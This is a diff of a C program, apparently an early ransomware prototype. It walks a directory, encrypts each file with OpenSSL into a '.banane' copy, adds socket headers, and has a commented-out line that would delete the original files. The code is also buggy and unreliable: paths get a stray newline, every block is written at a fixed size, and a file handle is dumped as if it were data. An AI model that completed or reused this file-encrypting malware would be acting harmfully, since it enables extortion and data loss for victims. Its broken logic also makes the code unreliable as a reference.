@@ -6,7 +6,9 @@
 #include <openssl/evp.h>
 #include <openssl/err.h>
 #include <openssl/rand.h>
-
+#include <sys/socket.h>
+#include <unistd.h>
+#include <arpa/inet.h>
 
 
 
@@ -110,7 +112,7 @@
 void list_dir(const char *path) {
 
     DIR *directory;
-    FILE *fp, *fp_out;
+    FILE *fp, *fp_out, *fp_dec;
     struct dirent *entry;
     directory = opendir(path);
     printf("Reading files in: %s\n", path);
@@ -138,8 +140,9 @@ void list_dir(const char *path) {
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
             char *buffer = (char *) malloc(lenght * sizeof(char));
             char *buffer_out = (char *) malloc(lenght * sizeof(char));
+            char *buffer_dcrpt = (char *) malloc(lenght * sizeof(char));
             if (buffer != NULL) {
-                snprintf(buffer, lenght, "%s/%s", path, file);
+                snprintf(buffer, lenght, "%s/%s\n", path, file);
 
                 if (buffer == NULL) {
                     printf("No file\n");
@@ -147,22 +150,28 @@ void list_dir(const char *path) {
 
                 printf("Opening %s \n", buffer);
                 fp = fopen(buffer, "r+");
-                snprintf(buffer_out, lenght+10, "%s/%s.banane", path, file);
-                fp_out = fopen(buffer_out, "a+");
+                snprintf(buffer_out, lenght+14, "%s/%s.banane", path, file);
+                snprintf(buffer_dcrpt, lenght+14, "%s/%s.dec", path, file);
+                fp_out = fopen(buffer_out, "w+");
+                fp_dec = fopen(buffer_dcrpt, "w+");
 
                 if (fp == NULL) {
                     printf("Can't open file\n");
                 } else {
-                    int read_file_len = fread(buffer, strlen(buffer) + 1, 1, fp);
-                    printf("%s\n", buffer);
-                    while (read_file_len != 0) {
-                        int file_crypted_len = encrypt(fp, read_file_len, key, iv, fp_out);
-                        fwrite(fp, file_crypted_len+1, 1, fp_out);
+                    unsigned char text_in_file[1024];
+                    unsigned char enc_text_in_file[1024];
+                    printf("buffer avant -> %s\n", buffer);
+                    int read_file_len;
+                    printf("buffer après -> %s\n", buffer);
+                    while ((read_file_len = fread(text_in_file, sizeof(unsigned char), 1024, fp)) != 0) {
+                        int file_crypted_len = encrypt(text_in_file, read_file_len, key, iv, enc_text_in_file);
+                        fwrite(enc_text_in_file, sizeof (unsigned char), 1024, fp_out);
                         BIO_dump_fp(stdout, (const char *) fp, file_crypted_len);
-                        fclose(fp);
-                        fclose(fp_out);
-                        free(buffer);
-                        free(buffer_out);
+                        
+                        //remove(buffer);
+                        printf("entrée : %s\n", buffer);
+                        printf("sortie : %s\n", buffer_out);
+
                     }
 
                 }
